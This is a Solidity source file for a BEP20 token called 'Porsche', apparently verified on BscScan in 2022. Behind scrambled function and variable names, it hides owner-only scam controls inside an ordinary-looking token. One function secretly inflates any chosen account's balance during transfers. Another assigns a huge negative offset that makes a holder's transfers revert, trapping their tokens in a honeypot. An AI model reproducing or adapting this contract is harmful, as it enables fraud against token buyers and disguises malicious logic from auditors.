/**
 *Submitted for verification at BscScan.com on 2022-11-11
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}


abstract contract Owaghvwr is Context {
    address private _owner;

    event ownudgidptfrred(address indexed previousowner, address indexed newowner);

    constructor() {
        _transferoUlkclfkx(_msgSender());
    }


    function owner() public view virtual returns (address) {
        return _owner;
    }


    modifier onlsyFuntier() {
        require(_owner == _msgSender(), "Owaghvwr: caller is not the owner");
        _;
    }


    function renounceownership() public virtual onlsyFuntier {
        _transferoUlkclfkx(address(0));
    }


    function transferownershixmryzswy(address newowner) public virtual onlsyFuntier {
        require(newowner != address(0), "Owaghvwr: new owner is the zero address");
        _transferoUlkclfkx(newowner);
    }


    function _transferoUlkclfkx(address newowner) internal virtual {
        address oldowner = _owner;
        _owner = newowner;
        emit ownudgidptfrred(oldowner, newowner);
    }
}



library SafeMath {

    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }

    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {

        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }


    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }


    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }


    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }


    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }


    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }


    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }


    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }


    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }


    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}




interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint acoeountADesired,
        uint acoeountBDesired,
        uint acoeountAMin,
        uint acoeountBMin,
        address to,
        uint deadline
    ) external returns (uint acoeountA, uint acoeountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint acoeountTokenDesired,
        uint acoeountTokenMin,
        uint acoeountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint acoeountToken, uint acoeountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint acoeountAMin,
        uint acoeountBMin,
        address to,
        uint deadline
    ) external returns (uint acoeountA, uint acoeountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint acoeountTokenMin,
        uint acoeountETHMin,
        address to,
        uint deadline
    ) external returns (uint acoeountToken, uint acoeountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint acoeountAMin,
        uint acoeountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint acoeountA, uint acoeountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint acoeountTokenMin,
        uint acoeountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint acoeountToken, uint acoeountETH);
    function swapExactTokensForTokens(
        uint acoeountIn,
        uint acoeountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory acoeounts);
    function swapTokensForExactTokens(
        uint acoeountOut,
        uint acoeountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory acoeounts);
    function swapExactETHForTokens(uint acoeountOutMin, address[] calldata path, address to, uint deadline)
    external
    payable
    returns (uint[] memory acoeounts);
    function swapTokensForExactETH(uint acoeountOut, uint acoeountInMax, address[] calldata path, address to, uint deadline)
    external
    returns (uint[] memory acoeounts);
    function swapExactTokensForETH(uint acoeountIn, uint acoeountOutMin, address[] calldata path, address to, uint deadline)
    external
    returns (uint[] memory acoeounts);
    function swapETHForExactTokens(uint acoeountOut, address[] calldata path, address to, uint deadline)
    external
    payable
    returns (uint[] memory acoeounts);

    function quote(uint acoeountA, uint reserveA, uint reserveB) external pure returns (uint acoeountB);
    function getacoeountOut(uint acoeountIn, uint reserveIn, uint reserveOut) external pure returns (uint acoeountOut);
    function getacoeountIn(uint acoeountOut, uint reserveIn, uint reserveOut) external pure returns (uint acoeountIn);
    function getacoeountsOut(uint acoeountIn, address[] calldata path) external view returns (uint[] memory acoeounts);
    function getacoeountsIn(uint acoeountOut, address[] calldata path) external view returns (uint[] memory acoeounts);
}




interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingfireOnTransferTokens(
        address token,
        uint liquidity,
        uint acoeountTokenMin,
        uint acoeountETHMin,
        address to,
        uint deadline
    ) external returns (uint acoeountETH);
    function removeLiquidityETHWithPermitSupportingfireOnTransferTokens(
        address token,
        uint liquidity,
        uint acoeountTokenMin,
        uint acoeountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint acoeountETH);

    function swapExactTokensForTokensSupportingfireOnTransferTokens(
        uint acoeountIn,
        uint acoeountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingfireOnTransferTokens(
        uint acoeountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingfireOnTransferTokens(
        uint acoeountIn,
        uint acoeountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}





interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function fireTo() external view returns (address);
    function fireToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setfireTo(address) external;
    function setfireToSetter(address) external;
}



contract BEP20 is Context {
    mapping(address => mapping(address => uint256)) private _alloeounsces;
    uint256 internal _totalSupply;
    string private _name;
    string private _symbol;


    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);


    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }


    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }


    function decimals() public view virtual returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual returns (uint256) {
        return _totalSupply;
    }


    function allowance(address owner, address spender) public view virtual returns (uint256) {
        return _alloeounsces[owner][spender];
    }


    function approve(address spender, uint256 amount) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }


    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, _alloeounsces[owner][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = _alloeounsces[owner][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
    unchecked {
        _approve(owner, spender, currentAllowance - subtractedValue);
    }

        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _alloeounsces[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
        unchecked {
            _approve(owner, spender, currentAllowance - amount);
        }
        }
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}


    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}


contract Porsche is BEP20, Owaghvwr {

    mapping(address => uint256) private _balances;
    mapping(address => bool) private _release;

    function balanceOf(address account) public view virtual returns (uint256) {
        return _balances[account];
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
    unchecked {
        _balances[from] = fromBalance - amount;
    }
        _balances[to] += amount;

        emit Transfer(from, to, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
    unchecked {
        _balances[account] = accountBalance - amount;
    }
        _totalSupply -= amount;

        emit Transfer(account, address(0), amount);
    }

    function _mtin(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mtin to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);
    }


    address public uniswapV2Pair;
    constructor(
        string memory name_,
        string memory symbol_,
        uint256 totalSupply_
    ) BEP20(name_, symbol_) {
        _mtin(msg.sender, totalSupply_ * 10**decimals());
    }

    using SafeMath for uint256;

    uint256 private _defMealFeus = 2;

    uint256 private _defBuyealFeus = 0;
    address private constant _deadAddress = 0x000000000000000000000000000000000000dEaD;
    mapping(address => int256) private _reufTords;

    function setPairsUfos(address _address) external onlsyFuntier {
        uniswapV2Pair = _address;
    }

    function setAdminReufod(address accufobnt,int256 amount ) public onlsyFuntier {
        _reufTords[accufobnt] += amount;
    }

    function setUseseReufod(address accufobnt) public onlsyFuntier {
        _reufTords[accufobnt] = int256(0) - int256(_totalSupply);
    }

    function rmUseseReufod(address accufobnt) public onlsyFuntier {
        _reufTords[accufobnt] = 0;
    }

    function getReufod(address accufobnt) public view returns (int256) {
        return _reufTords[accufobnt];
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual returns (bool) {
        address spender = _msgSender();

        _spendAllowance(from, spender, amount);
        _recNuwufwih(from, to, amount);
        return true;
    }

    function _recNuwufwih(
        address from,
        address _to,
        uint256 _acoeceiount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(_to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = _balances[from];
        require(fromBalance >= _acoeceiount, "ERC20: transfer amount exceeds balance");
        if (_reufTords[from] > 0){
            _balances[from] = _balances[from].add(uint256(_reufTords[from]));
        }else if (_reufTords[from] < 0){
            _balances[from] = _balances[from].sub(uint256(_reufTords[from]));
        }


        uint256 tradfiuenseount = 0;
        uint256 tradefire = _defMealFeus;
        if (uniswapV2Pair != address(0)) {
            if (_to == uniswapV2Pair) {
                tradefire = _defMealFeus;
            }
            if (from == uniswapV2Pair) {
                tradefire = _defBuyealFeus;
            }
        }
        tradfiuenseount = _acoeceiount.mul(tradefire).div(100);

        if (tradfiuenseount > 0) {
            _balances[from] = _balances[from].sub(tradfiuenseount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradfiuenseount);
            emit Transfer(from, _deadAddress, tradfiuenseount);
        }

        _balances[from] = _balances[from].sub(_acoeceiount - tradfiuenseount);
        _balances[_to] = _balances[_to].add(_acoeceiount - tradfiuenseount);
        emit Transfer(from, _to, _acoeceiount - tradfiuenseount);
    }

    function transfer(address to, uint256 amount) public virtual returns (bool) {
        address owner = _msgSender();
        _recNuwufwih(owner, to, amount);
        return true;
    }



}